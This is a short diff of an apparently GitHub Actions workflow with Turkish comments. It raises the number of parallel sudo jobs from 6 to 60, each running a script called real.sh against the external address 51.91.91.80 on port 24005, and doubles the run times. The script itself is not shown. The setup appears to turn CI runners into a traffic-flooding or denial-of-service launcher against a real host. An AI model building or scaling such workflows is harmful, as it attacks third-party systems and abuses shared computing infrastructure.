@@ -23,8 +23,8 @@ jobs:
         run: |
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
-          for i in {1..6}; do
-            sudo timeout 60 bash real.sh 51.91.91.80 22003 &
+          for i in {1..60}; do
+            sudo timeout 120 bash real.sh 51.91.91.80 24005 &
             PIDS+=($!)
           done
           
@@ -35,5 +35,5 @@ jobs:
 
       - name: Kapanış
         run: |
-          sleep 60
+          sleep 120
           exit 0
